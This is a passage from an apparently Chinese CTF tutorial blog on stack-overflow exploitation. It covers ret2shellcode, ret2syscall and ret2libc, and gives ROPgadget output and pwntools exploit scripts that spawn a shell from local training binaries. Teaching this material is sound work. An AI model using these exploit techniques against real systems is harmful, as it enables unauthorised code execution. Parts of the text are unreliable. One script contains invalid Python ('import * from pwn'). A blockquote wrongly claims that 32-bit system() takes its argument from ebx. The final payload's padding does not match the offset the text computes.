src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805174025800.png" class="" title="image-20240805174025800"><p>几乎没有开启任何保护，并且有可读，可写，可执行段。接下来再使用IDA对程序进行反编译：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805174222534.png" class="" title="image-20240805174222534"><p>程序仍然是基本的栈溢出漏洞，不过还同时将对应的字符串复制到buf2处。简单查看可知buf2在bss段。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805174556056.png" class="" title="image-20240805174556056"><p>这时，简单的调试下程序，看看这个bbs段是否可执行。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805174944995.png" class="" title="image-20240805174944995"><p>图中可以看出<code>0x804a000 ~ 0x804b000</code>没有可执行权限，因为环境是ubuntu22.04，内核的保护策略，使得程序中不再默认有同时具有可写可执行的段。</p><p>倘若有可执行权限，那么就控制程序执行shellcode，也就是读入shellcode，然后控制程序执行bbs段处的shellcode。其中，相应的偏移计算类似于ret2text中的例子。</p><p>最后的payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>ret2syscall，即控制程序执行系统调用，获取shell。</p><h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><p>继续以bamboofox中的ret2syscall为例。</p><p>首先检测程序开启的保护：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805190408974.png" class="" title="image-20240805190408974"><p>可以看出，源程序为32位，开启了NX保护。接下来利用IDA进行反编译：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240805191339538.png" class="" title="image-20240805191339538"><p>可以看出，这依然是一个栈溢出。类似于之前的做法，我们可以获得v4相对于ebp的偏移为108。所以需要覆盖的返回地址相对于v4的偏移为112.此次，由于不能直接利用程序中的某一段代码或者自己填写代码来获得shell，所以利用程序中的gadgets来获得shell，而对应的shell获取则是利用系统调用。</p><blockquote><p><strong>系统调用</strong></p><p>在电脑中，系统调用（system call），指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信。</p><p>操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。</p><p><strong>典型实现（Linux）</strong></p><p>Linux在x86上的系统调用通过<code>int 80h</code>实现，用<strong>系统调用号</strong>来区分入口函数。操作系统实现系统调用的基本过程是：</p><ol><li>应用程序调用库函数（API）；</li><li>API将系统调用号存入EAX，然后通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li><li>系统调用完成相应功能，将返回值存入EAX，返回到中断处理函数；</li><li>中断处理函数返回到API中；</li><li>API将EAX返回给应用程序。</li></ol><p>应用程序调用系统调用的过程是：</p><ol><li>把系统调用的编号存入EAX；</li><li>把函数参数存入其它通用寄存器；</li><li>触发0x80号中断（int 0x80）。</li></ol></blockquote><p>简单地说，只要把对应获取shell的系统调用的参数放到对应的寄存器中，那么在执行int 0x80就可以执行对应的系统调用。比如这里我们利用如下系统调用来获取shell：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>)<br></code></pre></td></tr></table></figure><p>其中，该程序是32位，所以我们需要使得</p><ul><li>系统调用号，即eax应该为0xb。（execve的系统调用号为11）</li><li>第一个参数，即ebx应该指向&#x2F;bin&#x2F;sh的地址，其实执行sh的地址也可以。</li><li>第二个参数，即ecx应该为0</li><li>第三个参数，即edx应该为0</li></ul><p>那么该如何控制这些寄存器的值呢？这里就需要使用gadgets。比如说，现在栈顶是10，那么如果此时执行了pop eax，那么现在eax的值就为10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制。这也是我们在gadgets最后使用ret来在此控制程序执行流程的原因。具体寻找gadgets的方法，我们可以使用ropgadgets这个工具。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@e16116b2042d:/CTF# ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x080bb196 : pop eax ; ret<br>0x0807217a : pop eax ; ret 0x80e<br>0x0804f704 : pop eax ; ret 3<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br></code></pre></td></tr></table></figure><p>可以看到有上述几个都可以控制eax，选取第二个作为gadgets</p><p>类似的，可以得到控制其他寄存器的gadgets</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e16116b2042d:/CTF# ROPgadget --binary rop --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span><br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x080bb196 : pop eax ; ret<br>0x0807217a : pop eax ; ret 0x80e<br>0x0804f704 : pop eax ; ret 3<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>root@e16116b2042d:/CTF# ROPgadget --binary rop --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;ebx&#x27;</span><br>0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret<br>0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret<br>0x080be23f : pop ebx ; pop edi ; ret<br>0x0806eb69 : pop ebx ; pop edx ; ret<br>0x08092258 : pop ebx ; pop esi ; pop ebp ; ret<br>0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10<br>0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14<br>0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc<br>0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4<br>0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8<br>0x08048913 : pop ebx ; pop esi ; pop edi ; ret<br>0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4<br>0x08049a94 : pop ebx ; pop esi ; ret<br>0x080481c9 : pop ebx ; ret<br>0x080d7d3c : pop ebx ; ret 0x6f9<br>0x08099c87 : pop ebx ; ret 8<br>0x0806eb91 : pop ecx ; pop ebx ; ret<br>0x0806336b : pop edi ; pop esi ; pop ebx ; ret<br>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret<br>0x0805c820 : pop esi ; pop ebx ; ret<br>0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0807b6ed : pop ss ; pop ebx ; ret<br></code></pre></td></tr></table></figure><p>这里，选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br></code></pre></td></tr></table></figure><p>这条指令可以直接控制其他三个寄存器。</p><p>此外，我们需要获得&#x2F;bin&#x2F;sh 字符串对应的地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@e16116b2042d:/CTF# ROPgadget --binary rop --string &#x27;/bin/sh&#x27;     <br>Strings information<br>============================================================<br>0x080be408 : /bin/sh<br></code></pre></td></tr></table></figure><p>可以找到对应的地址，此外，还有int 0x80的地址，如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@e16116b2042d:/CTF# ROPgadget --binary rop --only &#x27;int&#x27;<br>Gadgets information<br>============================================================<br>0x08049421 : int 0x80<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure><p>Payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>ret2libc即控制函数执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，选择执行system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道system函数的地址。</p><h4 id="example1"><a href="#example1" class="headerlink" title="example1"></a>example1</h4><p>以bamboofox中ret2libc1为例。</p><p>首先，依然check下安全保护：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@18f38f3e25f8:/CTF# checksec ret2libc1 <br>[*] <span class="hljs-string">&#x27;/CTF/ret2libc1&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br>    Debuginfo:  Yes<br><br></code></pre></td></tr></table></figure><p>源程序为32位，开启NX保护。随后对其进行反编译，以确定漏洞位置。反编译结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用gets函数，即栈溢出。可以利用ropgadget，查看是否有&#x2F;bin&#x2F;sh存在：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">root@<span class="hljs-number">18f</span>38f3e25f8:/CTF# ROPgadget --binary ret2libc1 --<span class="hljs-built_in">string</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>Strings information<br>============================================================<br><span class="hljs-number">0x08048720</span> : /bin/sh<br></code></pre></td></tr></table></figure><p>确实存在，再次查找下是否有system函数存在。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240813113016797.png" class="" title="image-20240813113016797"><p>存在，那么直接返回这个地址，即执行system函数。相应的payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">from</span> pwn<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh = <span class="hljs-number">0x08048720</span><br>system = <span class="hljs-number">0x08048460</span><br><br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>, binsh])<br>pause()<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>注意的是，为什么system的入口地址覆盖ret地址后，需要一个<code>b&#39;b&#39;*4</code>的填充，因为在执行函数体指令前，会push一个当前的地址，以便函数调用结束后能返回。根据栈帧结构可以看出，被调函数的ret_addr<strong>上面</strong>紧接着是函数</p></blockquote><h4 id="example2"><a href="#example2" class="headerlink" title="example2"></a>example2</h4><p>该题目与retlibc基本一致，只不过不再出现&#x2F;bin&#x2F;sh字符串，所以我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行”system(“&#x2F;bin&#x2F;sh”)。漏洞与上述一致。</p><p>老规矩，查看保护措施：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">dog@dog:~/Desktop/Temp$ checksec ret2libc2<br>[*] &#x27;/home/dog/Desktop/Temp/ret2libc2&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br>    Debuginfo:  Yes<br></code></pre></td></tr></table></figure><p>ida反编译：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923223038685.png" class="" title="image-20240923223038685"><p>例题的函数就是简单哈。gets栈溢出，覆盖返回地址。查看函数列表：</p><img src="/2024/08/15/二进制安全-基础/image-20240923223703138.png"  alt="image-20240923223703138" style="zoom:67%;" /><p>具有_system()函数，查找一下有没有”&#x2F;bin&#x2F;sh”字符串。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923225721335.png" class="" title="image-20240923225721335"><p>没有。那我也不知道咋办了。看看exp吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br>gets_plt = <span class="hljs-number">0x08048460</span><br>system_plt = <span class="hljs-number">0x08048490</span><br>pop_ebx = <span class="hljs-number">0x0804843d</span><br>buf2 = <span class="hljs-number">0x804a080</span><br>payload = flat(<br>    [<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="hljs-number">0xdeadbeef</span>, buf2])<br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>计算填充：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923230002770.png" class="" title="image-20240923230002770"><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923230036613.png" class="" title="image-20240923230036613"><p>那么，32位程序的填充就是108+4就是112。而返回地址是gets_plt，不理解。ida看看这个地址。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240923230200351.png" class="" title="image-20240923230200351"><p>居然是gets函数的地址。返回地址又重新进入的gets函数。</p><p>buf2是在.bss段定义的变量。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240924183050946.png" class="" title="image-20240924183050946"><p>这个.bss段具有写的权限吗？因为我们需要在这个变量中写入数据。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240924183432910.png" class="" title="image-20240924183432910"><p>可以看到，s变量所在的区间没有可写的权限，有可读可执行。再者，因为s变量是局部变量，而.bss段的是全局变量，且具有可写权限，因此作为我们ROP的第一跳。</p><blockquote><ol><li><code>gets</code> 函数执行完后，会返回到 <code>pop_ebx</code> 指令的地址。</li><li><code>pop_ebx</code> 指令会弹出栈顶的 4 个字节，并将该值写入 <code>ebx</code> 寄存器，此时 <code>ebx</code> 寄存器存放的是 <code>buf2</code> 地址。</li><li>程序执行下一条指令，即 <code>system_plt</code> 地址。</li><li>程序执行 <code>system_plt</code> 地址，会跳转到 <code>system</code> 函数的 <code>.plt</code> 段条目，最终执行 <code>system</code> 函数。</li><li>此时 <code>system</code> 函数的第一个参数是 <code>buf2</code> 地址，因为之前 <code>pop_ebx</code> 指令将 <code>buf2</code> 地址写入 <code>ebx</code> 寄存器，而 <code>system</code> 函数会将 <code>ebx</code> 寄存器的值作为第一个参数。</li><li><code>system</code> 函数的第二个参数是 <code>buf2</code> 地址，因为你之前在构造 payload 时已经将 <code>buf2</code> 地址写入到栈中，作为第二个参数。</li></ol></blockquote><p>一切是那样好~</p><h4 id="example3"><a href="#example3" class="headerlink" title="example3"></a>example3</h4><p>题目类似，我们查看源码：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241001210342900.png" class="" title="image-20241001210342900"><p>查看保护机制：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">dog@dog:~/Desktop/Temp$ pwn checksec --file ret2libc3<br>[*] &#x27;/home/dog/Desktop/Temp/ret2libc3&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br>    Debuginfo:  Yes<br></code></pre></td></tr></table></figure><p>只有<strong>NX</strong>保护，即开启了<strong>堆栈不可执行</strong>保护。</p><p>其漏洞利用点依然是gets函数的栈溢出。再查看函数列表：</p><img src="/2024/08/15/二进制安全-基础/image-20241001210721679.png"  alt="image-20241001210721679" style="zoom:80%;" /><p>发现并没有system函数。也没有&#x2F;bin&#x2F;sh字符串的地址。重要的是如何获得system函数的地址。</p><blockquote><ul><li><strong>system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。</strong></li><li>即使程序有ASLR保护，也只是针对地址中间位进行随机的，最低的12位并不会发生改变。而libc在github上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul></blockquote><p>所以，如果能够知道libc中的某个函数的地址，那么可以确定该程序调用的libc地址。进而就可以知道system函数的地址。那么该如何得到libc中的某个函数的地址呢？一般常用的方法是采用<strong>got表泄露</strong>，即输出某个函数对应的got表现内容。当然，由于<strong>libc的延迟绑定机制</strong>，需要泄露已经执行过的函数的地址。</p><blockquote><p>libc的延迟绑定机制是指在程序运行时，动态链接库的函数地址并非在程序加载时就确定，而是第一次调用该函数时才进行地址绑定。</p><p>延迟绑定机制的步骤如下：</p><ol><li><p>程序加载</p><p>当程序加载时，libc库的函数地址并不被解析，而是被设置为一个特殊的地址，例如<code>0x8048270</code>。</p></li><li><p>第一次调用</p><p>当程序第一次调用一个动态链接库函数时，例如<code>printf</code>，程序会执行plt中的跳转指令。</p></li><li><p>解析地址</p><p>plt指令会跳转到got中的地址。由于该地址尚未解析，所以程序会进入一个称为<code>lazy binding</code>的过程，该过程会查找动态链接库的符号表，找到<code>printf</code>函数的地址，并将地址写入got中。</p></li><li><p>后续调用</p><p>在后续的调用中，程序会直接跳转到got中的地址，不再需要进行地址解析。</p></li></ol></blockquote><p>因此，可以根据上面的步骤先得到libc库基地址，之后在程序中查询偏移，然后获取system函数地址。</p><p>这里选择泄露<code>__libc_start_main</code>的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露<code>__libc_start_main</code>地址</li><li>获取libc版本</li><li>获取system地址与&#x2F;bin&#x2F;sh地址</li><li>再次执行源程序</li><li>出发栈溢出执行system(‘&#x2F;bin&#x2F;sh’)</li></ul><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<span class="hljs-comment"># 使用pwntools加载ret2libc3的ELF文件，获取程序的各种信息。</span><br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment"># 获取puts函数的PLT地址</span><br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<span class="hljs-comment"># 获取__libc_start_main函数的got地址</span><br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<span class="hljs-comment"># 获取main函数的地址</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span>)<br><span class="hljs-comment"># 112个A的填充。返回地址为puts_plt地址。随后执行完的返回地址为main函数的地址，给puts函数传递的参数为libc_start_main函数的got表地址</span><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got])<br>sh.sendlineafter(<span class="hljs-string">b&#x27;Can you find it !?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get the related addr&quot;</span>)<br>libc_start_main_addr = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment"># 接受程序返回的__libc_start_main函数的got地址。</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br><span class="hljs-comment"># 这里之所以需要减，是因为这个偏移地址是通过LibcSearcher库获取的__libc_start_main函数在库中的偏移地址。这个偏移地址是相对于libc库的基地址而言的，也就是从libc库的起始位置到__libc_start_main函数的距离。</span><br><span class="hljs-comment"># 为了得出libc库的基地址，需要将__libc_start_main的实际地址减去它的偏移地址。这就好比你知道了某个地点的实际地址（libc_start_main_addr），也知道了这个地点距离你家有多远（libc.dump(&#x27;__libc_start_main&#x27;)），那么你就能计算出你家的地址(libcbase)。</span><br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br><span class="hljs-comment"># libc.dump()计算出的都是偏移地址。基地址+偏移地址便是函数实际地址。</span><br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get shell&quot;</span>)<br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>泄露libc库的原理</p><blockquote><ol><li><strong>利用GOT(Global Offset Table，全局偏移表)和 PLT(Procedure Linkage 